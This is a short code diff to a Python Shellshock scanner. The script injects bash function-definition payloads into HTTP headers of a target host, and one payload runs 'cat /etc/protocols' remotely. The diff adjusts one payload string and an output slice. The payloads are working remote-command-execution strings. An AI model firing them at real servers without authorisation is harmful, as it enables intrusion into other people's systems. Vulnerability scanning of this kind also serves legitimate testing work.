@@ -16,7 +16,7 @@ if (len(sys.argv)<=1) or (len(sys.argv)>2):
 1: list protocols from /etc/ on host
 '''
 payloads = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
-            2:'() { ;;}; echo \"Busted\"',
+            2:'() { :;} ; echo busted',
            }
 http_headers = ['User-Agent', 'Referer', 'Cookie', 'Host']
 
@@ -39,7 +39,7 @@ for each in payloads:
             if 'tcp' in match:
                 print ('Host: ' + query + confirm)
                 print ('Payload: ' + str(heads) + ':' + str(payloads[each]))
-                print(match[314:350])
+                print(match[314:375])
             elif 'root' in match:
                 print ('Host: ' + query + confirm)
                 print ('Payload: ' + str(heads) + ':' + str(payloads[each]))
